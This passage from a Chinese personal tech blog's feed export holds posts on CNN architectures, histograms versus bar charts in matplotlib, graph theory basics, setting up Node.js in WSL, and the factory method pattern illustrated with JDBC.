<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C2-2-2.png" alt="2-2-2"></p>
<p><code>AlexNet</code> 的5层卷积层如下（224x224加2padding结果 约等于 227x227加0padding结果，论文的描述问题，不关键）：</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C2-2-3.png" alt="2-2-3"></p>
<ul>
<li><code>VGG - 16</code>：16代表有16层网络，其主要改进之处在于多个卷积层后再接一个池化层，基本结构如下图，<code>[CONV 64] x2</code> 表示经过两个有64个 <code>filter</code> 的卷积层，卷积的规则如图上方所示。</li>
</ul>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5C2-2-4.png" alt="2-2-4"></p>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>复习直方图与条形图</title>
    <url>/%E5%A4%8D%E4%B9%A0%E7%9B%B4%E6%96%B9%E5%9B%BE%E4%B8%8E%E6%9D%A1%E5%BD%A2%E5%9B%BE.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>在用python实现正态分布等概率分布函数时，混淆了直方图和条形图，又由于概率论没学到位，导致实现中遇到了不小的困难。</p>
<p>因而，借此篇博客复习一下，高中所学的直方图和条形图。。。</p>
<span id="more"></span>

<h2 id="1-直方图"><a href="#1-直方图" class="headerlink" title="1. 直方图"></a>1. 直方图</h2><h3 id="1-1-理解"><a href="#1-1-理解" class="headerlink" title="1.1. 理解"></a>1.1. 理解</h3><p>首先，举一个直方图的例子：</p>
<p><img src="/%E5%A4%8D%E4%B9%A0%E7%9B%B4%E6%96%B9%E5%9B%BE%E4%B8%8E%E6%9D%A1%E5%BD%A2%E5%9B%BE/2.png" alt="2"></p>
<p>显然，直方图就是有很多根柱子的图。</p>
<p>假设，数据集合<code>X</code>是分布在实数集上的随机数集合，<code>|X|=100</code>。</p>
<p>对于直方图中的每个柱子：</p>
<ul>
<li><p>其<strong>宽</strong>对应<strong>横轴上的一个区间</strong>；</p>
</li>
<li><p>其<strong>高</strong>对应<strong>集合<code>X</code>中属于该区间的数的个数</strong>。</p>
</li>
</ul>
<p><strong>频数分布直方图 (归一化直方图)</strong> 是直方图中的一种，它的特殊在于：</p>
<ul>
<li>其<strong>高</strong>对应该区间的计数除以集合<code>X</code>中的总数，即代表该区间的频数。</li>
</ul>
<p>上述例子便是一张频数分布直方图。</p>
<h3 id="1-2-python代码实现"><a href="#1-2-python代码实现" class="headerlink" title="1.2. python代码实现"></a>1.2. python代码实现</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x = np.random.normal(<span class="number">1</span>,<span class="number">2</span>,<span class="number">100</span>) <span class="comment"># 生成100个服从 N(1,2^2) 的正态分布的随机数</span></span><br><span class="line"></span><br><span class="line">value, bins, count = plt.hist(x, bins=<span class="number">30</span>, normed=<span class="literal">True</span>) <span class="comment"># 根据x中的数据，画有30个连续区间的频数直方图</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;value:&#x27;</span>, value, <span class="built_in">len</span>(value))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bins:&#x27;</span>, bins, <span class="built_in">len</span>(bins))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;count:&#x27;</span>, count)</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="/%E5%A4%8D%E4%B9%A0%E7%9B%B4%E6%96%B9%E5%9B%BE%E4%B8%8E%E6%9D%A1%E5%BD%A2%E5%9B%BE/3.png" alt="3"></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">value: [0.03220688 0.03220688 0.         0.09662064 0.03220688 0.06441376</span><br><span class="line"> 0.03220688 0.03220688 0.22544816 0.12882752 0.19324128 0.12882752</span><br><span class="line"> 0.3220688  0.22544816 0.25765504 0.06441376 0.12882752 0.22544816</span><br><span class="line"> 0.1610344  0.1610344  0.1610344  0.09662064 0.09662064 0.06441376</span><br><span class="line"> 0.         0.06441376 0.09662064 0.         0.         0.09662064] 30</span><br><span class="line">bins: [-3.97482069 -3.66432802 -3.35383536 -3.04334269 -2.73285002 -2.42235735</span><br><span class="line"> -2.11186468 -1.80137201 -1.49087934 -1.18038668 -0.86989401 -0.55940134</span><br><span class="line"> -0.24890867  0.061584    0.37207667  0.68256934  0.993062    1.30355467</span><br><span class="line">  1.61404734  1.92454001  2.23503268  2.54552535  2.85601801  3.16651068</span><br><span class="line">  3.47700335  3.78749602  4.09798869  4.40848136  4.71897403  5.02946669</span><br><span class="line">  5.33995936] 31</span><br><span class="line">count: &lt;a list of 30 Patch objects&gt;</span><br></pre></td></tr></table></figure>

<p>对于<code>plt.hist()</code>函数：</p>
<ul>
<li><p><code>params</code>参数：</p>
<ul>
<li><p><code>x</code>: <code>x</code>轴上的数据集</p>
</li>
<li><p><code>bins</code>: 表示划分区间的个数，即柱子的个数</p>
</li>
<li><p><code>normed</code>: 表示是否归一化，若为<code>True</code>，则显示频数直方图</p>
</li>
<li><p>……</p>
</li>
</ul>
</li>
<li><p><code>return</code>返回值：</p>
<ul>
<li><p><code>value</code>: 每个区间对应的<code>y</code>值</p>
</li>
<li><p><code>bins</code>: 每个区间上下限的<code>x</code>值，如果有30个区间，则<code>len(bins)</code>为31</p>
</li>
<li><p><code>count</code>: 区间的个数</p>
</li>
</ul>
</li>
</ul>
<p>其详情见<a href="https://matplotlib.org/3.1.1/api/_as_gen/matplotlib.pyplot.hist.html">官网</a></p>
<h2 id="2-条形图"><a href="#2-条形图" class="headerlink" title="2. 条形图"></a>2. 条形图</h2><h3 id="2-1-理解"><a href="#2-1-理解" class="headerlink" title="2.1. 理解"></a>2.1. 理解</h3><p>举个栗子：</p>
<p><img src="/%E5%A4%8D%E4%B9%A0%E7%9B%B4%E6%96%B9%E5%9B%BE%E4%B8%8E%E6%9D%A1%E5%BD%A2%E5%9B%BE/1.png" alt="1"></p>
<p>条形图似乎也是一个很多柱子的图。这便是条形图与直方图容易混淆的原因了。但，条形图的柱子似乎<strong>细很多</strong>呢。</p>
<p>其实，条形图相对直方图，更好理解。</p>
<p>条形图中，横坐标代表<code>x</code>值，纵坐标代表<code>y=f(x)</code>值。所以，条形图的边界就是对应函数<code>f(x)</code>图像的一部分了。</p>
<h3 id="2-2-python代码实现"><a href="#2-2-python代码实现" class="headerlink" title="2.2. python代码实现"></a>2.2. python代码实现</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;正态分布公式&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normal_distribution</span>(<span class="params">mean, standard, x</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> / (standard * np.sqrt(<span class="number">2</span>*np.pi)) * np.exp(-(x-mean)**<span class="number">2</span> / (<span class="number">2</span> * standard**<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">x = np.random.normal(<span class="number">1</span>,<span class="number">2</span>,<span class="number">100</span>) <span class="comment"># 生成100个服从 N(1,2^2) 的正态分布的随机数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;x:&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">y = normal_distribution(<span class="number">1</span>,<span class="number">2</span>,x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;y:&#x27;</span>, y)</span><br><span class="line">plt.bar(x, y) <span class="comment"># 画条形图。横轴为x，纵轴为y。</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="/%E5%A4%8D%E4%B9%A0%E7%9B%B4%E6%96%B9%E5%9B%BE%E4%B8%8E%E6%9D%A1%E5%BD%A2%E5%9B%BE/4.png" alt="4"></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">x: [ 1.76932332  0.36522094  5.1450445   0.05004145  1.7720948   2.72576013</span><br><span class="line"> -0.10808016  1.89746125  3.63410412  2.91262325  4.10054093 -0.89758685</span><br><span class="line">  1.11546737  4.27508464  0.76085493  1.47257128  4.5245259   2.34713613</span><br><span class="line"> -0.05875876  8.75851437 -0.86486252 -0.34872341  0.07018679  0.88436324</span><br><span class="line">  0.48392354  0.1297039  -0.59002276  3.10785551  1.3165206   2.71668659</span><br><span class="line">  2.11486526 -0.84586926 -0.3576636   2.09204617  0.53542808  4.48640303</span><br><span class="line"> -0.52501128 -2.04203587 -1.57609217  0.92228732 -2.28138689  1.92260707</span><br><span class="line">  1.94208858  3.98329461 -4.28621987  0.0471915  -4.21319167  0.80202259</span><br><span class="line">  3.875302    2.73255094 -1.40581636  1.17265753 -2.22711288  1.1008017</span><br><span class="line">  1.87824436  3.10236217  1.43048658  1.00748939  4.80039664  0.8898163</span><br><span class="line">  2.82500036  1.7141756  -1.2301184   1.16866276  1.66890047  0.6901983</span><br><span class="line">  1.42811743  1.22482293 -0.25517217  1.78918545 -2.82314372 -1.79081425</span><br><span class="line"> -0.48748191  2.9755605  -2.07325393  1.17953198  3.76772486  0.41385189</span><br><span class="line">  0.83417547  1.15602977 -3.80374808 -1.63877772  2.14545695  3.10734999</span><br><span class="line"> -3.17789913  1.86693313  0.41279216  2.02547252  1.60170928  1.83176309</span><br><span class="line">  4.23187971 -0.3603266  -0.73596668  1.21855677 -2.12121712 -0.20157449</span><br><span class="line">  0.06652799  2.84224194  2.15910299  3.5127497 ]</span><br><span class="line">y: [1.85246481e-01 1.89672995e-01 2.32893302e-02 1.78192943e-01</span><br><span class="line"> 1.85147586e-01 1.37467642e-01 1.71089936e-01 1.80366335e-01</span><br><span class="line"> 8.37935889e-02 1.26267617e-01 5.99793484e-02 1.27175126e-01</span><br><span class="line"> 1.99138981e-01 5.21903254e-02 1.98050247e-01 1.93979816e-01</span><br><span class="line"> 4.22195850e-02 1.58987025e-01 1.73390851e-01 1.07673843e-04</span><br><span class="line"> 1.29147548e-01 1.58902008e-01 1.79038432e-01 1.99138006e-01</span><br><span class="line"> 1.92939699e-01 1.81452272e-01 1.45423186e-01 1.14467130e-01</span><br><span class="line"> 1.96988707e-01 1.38005420e-01 1.70767673e-01 1.30290347e-01</span><br><span class="line"> 1.58422143e-01 1.71846040e-01 1.94161674e-01 4.36539516e-02</span><br><span class="line"> 1.49151436e-01 6.27351432e-02 8.70200197e-02 1.99320615e-01</span><br><span class="line"> 5.19214540e-02 1.79337425e-01 1.78524921e-01 6.55729800e-02</span><br><span class="line"> 6.06572758e-03 1.78072195e-01 6.67586408e-03 1.98496245e-01</span><br><span class="line"> 7.09694403e-02 1.37064685e-01 9.67543721e-02 1.98729228e-01</span><br><span class="line"> 5.42654299e-02 1.99217948e-01 1.81137321e-01 1.14798536e-01</span><br><span class="line"> 1.94903532e-01 1.99469742e-01 3.27955468e-02 1.99168661e-01</span><br><span class="line"> 1.31543984e-01 1.87150614e-01 1.07124430e-01 1.98763102e-01</span><br><span class="line"> 1.88621259e-01 1.97092356e-01 1.94953096e-01 1.98214821e-01</span><br><span class="line"> 1.63814947e-01 1.84531071e-01 3.20922985e-02 7.53458647e-02</span><br><span class="line"> 1.51274227e-01 1.22463700e-01 6.12557886e-02 1.98669094e-01</span><br><span class="line"> 7.65643798e-02 1.91085957e-01 1.98786691e-01 1.98865040e-01</span><br><span class="line"> 1.11469968e-02 8.35358669e-02 1.69298023e-01 1.14497623e-01</span><br><span class="line"> 2.25067310e-02 1.81584831e-01 1.91056259e-01 1.74901040e-01</span><br><span class="line"> 1.90644952e-01 1.82945965e-01 5.40569843e-02 1.58278875e-01</span><br><span class="line"> 1.36861850e-01 1.98283670e-01 5.90225768e-02 1.66533569e-01</span><br><span class="line"> 1.78885926e-01 1.30508407e-01 1.68633817e-01 9.05978680e-02]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>图-离散数学</title>
    <url>/%E5%9B%BE.html</url>
    <content><![CDATA[<h2 id="一、图的基本概念"><a href="#一、图的基本概念" class="headerlink" title="一、图的基本概念"></a>一、图的基本概念</h2><h3 id="1-图的定义"><a href="#1-图的定义" class="headerlink" title="1.图的定义"></a>1.图的定义</h3><p>由顶点构成的集合，称为顶点集 V 。</p>
<p>由顶点构成的 无方向的<code>无序对 (v1, v2)</code> 或 有方向的<code>有序对 &lt;v1, v2&gt;</code> 称为边 e 。由边构成的集合，称为边集 E 。</p>
<p>由 V E 构成的二元组 &lt;V, E&gt; 就是图，无向图称为 G ，有向图称为 D 。</p>
<span id="more"></span>

<p>一些图的叫法：</p>
<ul>
<li>有 n 个点为n阶图&#x2F;有向图。</li>
<li>无边，叫零图。</li>
<li>无点，叫空图。</li>
<li>将有向图的边去掉方向的无向图，是有向图的基图。</li>
</ul>
<h3 id="2-点和边的定义"><a href="#2-点和边的定义" class="headerlink" title="2.点和边的定义"></a>2.点和边的定义</h3><h4 id="无向图中："><a href="#无向图中：" class="headerlink" title="无向图中："></a>无向图中：</h4><p>点与边关联后，点称作边的<em>端点</em>。</p>
<p>两个点关联于一条边，则这两个点是<em>相邻的</em>。点v的所有相邻点的<em>集合</em>为v的<em>领域</em>。</p>
<p>两条边的有一个公共端点，则这两条是<em>相邻的</em>。</p>
<h4 id="有向图中："><a href="#有向图中：" class="headerlink" title="有向图中："></a>有向图中：</h4><p><code>ei = &lt;vi, vj&gt;</code> vi是边ei的<em>始点</em>，vj是<em>终点</em>。</p>
<p>两个点，vi邻接到vj，vj邻接于vi。</p>
<h4 id="环与平行边"><a href="#环与平行边" class="headerlink" title="环与平行边"></a>环与平行边</h4><p>自己连到(包括有向、无向)自己的边为环。相同的边(两点相同、有向图中还要方向相同)为平行边。</p>
<h3 id="3-度"><a href="#3-度" class="headerlink" title="3.度"></a>3.度</h3><p>无向图中，以v点为端点的边(即与v点相连的边)的条数，为v的度数，称作d(v)。</p>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>鉴于离散数学课程成绩惨不忍睹，就不在此献丑了。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>离散数学</tag>
      </tags>
  </entry>
  <entry>
    <title>在WSL中安装node的问题与解决</title>
    <url>/%E5%9C%A8WSL%E4%B8%AD%E5%AE%89%E8%A3%85node%E7%9A%84%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于下载<code>WSL+cmder</code>后，再也不想打开Windows的命令行了，便想将Windows下的环境变量也在WSL中设置一份，Node即其中之一。由于Windows二进制文件与linux的不兼容，所以是不能直接使用Windows下的环境变量的。于是，便需要自己手动在linux中下载node。</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>在linux下，下载软件方式众多。由于我不太喜欢用<code>apt-get</code>进行下载，便准备自行下载。</p>
<p>首先，找到nodejs官网上<strong>编译后的linux下载安装包的链接</strong>(此处不选择源码下载，懒于编译)。</p>
<p>下载安装包：<code>wget https://nodejs.org/dist/v10.15.1/node-v10.15.1-linux-x64.tar.xz</code>。</p>
<p>解压安装包：<code>tar xvf node-v10.15.1-linux-x64.tar.xz</code></p>
<p>将解压后的文件移动到<code>/usr/app</code>目录下，这是我自定义的软件下载目录。</p>
<span id="more"></span>

<h3 id="配置环境变量-第一种"><a href="#配置环境变量-第一种" class="headerlink" title="配置环境变量(第一种)"></a>配置环境变量(第一种)</h3><p>将nodejs加入环境变量中</p>
<p>修改配置全局环境变量配置文件：<code>vim /etc/profile</code> (需要root权限)</p>
<p>添加以下内容：</p>
<figure class="highlight profile"><table><tr><td class="code"><pre><span class="line">export NODE_HOME=/usr/app/node-v10.15.1-linux-x64</span><br><span class="line">export PATH=$PATH:$NODE_HOME/bin</span><br></pre></td></tr></table></figure>

<p>大意是在所有的环境变量之后，加入node可执行文件的目录(即node环境变量)。</p>
<p>使用配置文件生效：<code>source /etc/profile</code> 或者 <code>重启</code></p>
<h3 id="配置配置环境变量-第二种"><a href="#配置配置环境变量-第二种" class="headerlink" title="配置配置环境变量(第二种)"></a>配置配置环境变量(第二种)</h3><p>将可执行文件软链接到<code>/usr/bin/</code>目录下，该目录包涵了所有的可执行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/app/node-v10.15.1-linux-x64/bin/node /usr/bin/</span><br><span class="line"><span class="built_in">ln</span> -s /usr/app/node-v10.15.1-linux-x64/bin/npm /usr/bin/</span><br></pre></td></tr></table></figure>

<p>注意：软链接一定要用<strong>绝对路径</strong>。</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p><code>node -v</code> 查看无误</p>
<p><code>npm -v</code> 查看出错。报错原因：它找到Windows下node环境变量中npm执行文件，出错。</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p><code>echo $PATH</code> 查看环境变量，发现其中有两个nodejs环境变量路径，前一个为windows的，后一个为linux的。WSL的缺点之处便在于：环境变量杂糅。</p>
<p>似乎找到了问题所在：由于Windows的node环境变量优先于linux的，所以系统先匹配到Windows的node环境变量。但是，<code>node -v</code>为什么可以执行呢？我也无从而知了(简称无知)。</p>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>修改<code>/etc/profile</code>文件</p>
<p>将 <code>export PATH=$PATH:$NODE_HOME/bin</code> 换成 <code>export PATH=$NODE_HOME/bin:$PATH</code></p>
<p>即将node环境变量置于所有环境变量之前。修改完别忘记<code>source /etc/profile</code>。</p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>工厂方法模式</title>
    <url>/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F.html</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>工厂方法模式(Factory Method)，又称虚构造器。在《设计模式》中如此定义：</p>
<blockquote>
<p>定义一个用于创建对象的接口，让子类决定实例化哪一个类。Factory Method 使一个类的实例化延迟到其子类。</p>
</blockquote>
<p>工厂方法模式中包含四个核心角色：抽象工厂、具体工厂、抽象产品、具体产品。</p>
<span id="more"></span>

<p>工厂方法模式示例图如下：</p>
<p><img src="/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/%E5%9B%BE%E7%89%871.png" alt="工厂方法模式"></p>
<ul>
<li><p><code>Creator</code>类为抽象工厂类，包含一个虚方法<code>FactoryMethod()</code>，具体由子类实现；包含一个类方法<code>AnOperation()</code>，该方法中通过调用<code>FactoryMethod()</code>类获取产品。</p>
</li>
<li><p><code>ConcreteCreator</code>类为具体工厂类，继承于<code>Creator</code>类，实现了<code>FactoryMethod()</code>方法，该方法<strong>实例化</strong>并返回一个<code>ConcreteProduct</code>类。</p>
</li>
<li><p><code>Product</code>类为抽象产品类。</p>
</li>
<li><p><code>ConcreteProduct</code>类为具体产品类。</p>
</li>
</ul>
<h3 id="理解工厂方法模式"><a href="#理解工厂方法模式" class="headerlink" title="理解工厂方法模式"></a>理解工厂方法模式</h3><p>理解之前，我们先来讲一个小明买衣服的故事。</p>
<h4 id="小明买衣服"><a href="#小明买衣服" class="headerlink" title="小明买衣服"></a>小明买衣服</h4><p>假设，小明需要一件衣服。</p>
<p>同时，夏天小明需要的衣服是短袖，冬天小明需要的衣服是棉袄。</p>
<p>但是呢，小明不会自己织造衣服，更不理解衣服织造的过程，他只是想得到这么一件衣服。</p>
<p>所以，他需要向生产衣服的工厂购买衣服。假设工厂A生产短袖、工厂B生产棉袄。那么，夏天小明需要向工厂A购买短袖，冬天小明需要向工厂B购买棉袄。</p>
<p>甚至，小明还需要毛衣、外套，那他只要在需要时，向对应工厂C(生产毛衣)、工厂D(生产外套)，购买毛衣、外套即可。</p>
<p>换而言之，小明只需要更换相应的工厂就能得到相应的衣服(产品)。</p>
<h4 id="由此及彼"><a href="#由此及彼" class="headerlink" title="由此及彼"></a>由此及彼</h4><p>其实，小明买衣服的过程就是工厂方法模式的应用。短袖、棉袄等是具体的产品，继承与衣服抽象类。工厂A、B、C、D则是具体的工厂，继承与抽象工厂。每个工厂返回对应的、独有的产品<strong>实例</strong>，就是工厂方法的作用。</p>
<p>在工厂方法这种模式下，不管有多少新增产品，只要创建出生产对应产品的具体工厂实例即可。完全符合<strong>开闭原则</strong>(允许扩展，不允许修改)。</p>
<p>虽然，用户不需要知道产品的生产过程，但是，用户必须知道对应的具体工厂，才能得到对应的产品。而且，想要获得一个简单的产品，必须创建一个具体工厂，这也是工厂方法模式的一个缺陷。</p>
<p>或许，没有结合实际，你还不清楚这个模式究竟有什么用处。</p>
<p>那接下来，我将结合<code>java</code>代码进行演示，并用<code>jdbc</code>的例子来说明该模式的作用。</p>
<h3 id="代码演示-java"><a href="#代码演示-java" class="headerlink" title="代码演示(java)"></a>代码演示(java)</h3><p>首先，我们先创建出抽象产品和抽象工厂类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抽象产品</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抽象工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Creator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 工厂方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Product <span class="title function_">createProudct</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用createProduct()虚方法，实例化产品</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printProductInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> createProudct();</span><br><span class="line">        System.out.println(<span class="string">&quot;生产出具体产品&quot;</span>);</span><br><span class="line">        product.printInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，我们创建具体产品A，重载并实现抽象产品类中的虚方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct_A</span> <span class="keyword">extends</span> <span class="title class_">Product</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConcreteProduct_A</span><span class="params">(String name, <span class="type">int</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;this is concrete product a, product&#x27;s name is %s, product&#x27;s price is %d.\n&quot;</span>, name, price);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：此时用户并不知道产品A是如何实现的，也不知道产品A的类名，用户只知道获得一件产品之后可以打印产品信息。因此，用户无法通过<code>new ConreteProduct_A()</code>来获得这个<strong>产品对象</strong>。</p>
<p>接着，我们创建生产产品A的具体工厂A：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteCreator_A</span> <span class="keyword">extends</span> <span class="title class_">Creator</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">createProudct</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct_A</span>(<span class="string">&quot;productA&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于工厂A继承于抽象工厂，便可以调用<code>printProductInfo()</code>方法，来打印自己生产的产品的信息。</p>
<p>同时，告诉用户工厂A <code>ConcreteCreator_A</code> 可以生产产品A，只要调用工厂A的<code>createProudct()</code>方法即可。于是，用户便可以如下获取并使用产品A：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Creator</span> <span class="variable">creatorA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcreteCreator_A</span>();</span><br><span class="line"><span class="type">Product</span> <span class="variable">productA</span> <span class="operator">=</span> creatorA.createProudct();</span><br><span class="line">productA.printInfo();</span><br></pre></td></tr></table></figure>

<p>但是问题来了，为什么不直接告诉用户产品A的类名<code>ConcreteProduct_A</code>，用户直接<code>new ConcreteProduct_A()</code>，不也能得到产品A的实例吗？</p>
<p>其实，真正的工厂方法并没有那么简单，不是直接<code>new ConcreteProduct_A()</code>返回一个产品实例就完事的，而是需要对产品进行相应的“封装”才返回给用户的。</p>
<h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><h4 id="JDBC数据库连接"><a href="#JDBC数据库连接" class="headerlink" title="JDBC数据库连接"></a>JDBC数据库连接</h4><p>以<code>JDBC</code>为例，我们用<code>java</code>连接<code>MySql</code>数据库的常规代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;     <span class="comment">// jdk数据库连接器</span></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  <span class="comment">// jdk驱动加载管理器</span></span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;      <span class="comment">// jdk数据接收器</span></span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;      <span class="comment">// jdk数据sql执行对象</span></span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.Driver;   <span class="comment">// 导入mysql的jdbc包</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、首先咱们把mysql的驱动交给java管理</span></span><br><span class="line">DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、建立数据库连接，并得到数据库连接对象</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://url&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;xxxxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、得到执行sql的对象</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">sta</span> <span class="operator">=</span> conn.createStatement();</span><br></pre></td></tr></table></figure>

<p>在这个过程中，<code>java.sql.Connection</code>和<code>java.sql.Driver</code>是<code>java</code>提供给数据库方的<strong>接口</strong>。<code>java</code>提供这种规范，要求数据库方必须实现这两个接口，才能让<code>java</code>连接到数据库。同时，由于是接口，用户不能实例化，只有通过工厂方法才能得到实例对象。</p>
<p><code>java.sql.Connection</code>相当于抽象产品，<code>java.sql.Driver</code>相当于抽象工厂。<code>com.mysql.jdbc.Driver</code>相当于产生具体产品(<code>mysql</code>连接)的具体工厂。而至于具体产品，用户甚至不需要知道它的类名，只需要知道<code>Connection</code>接口中定义了哪些可以使用的方法即可。</p>
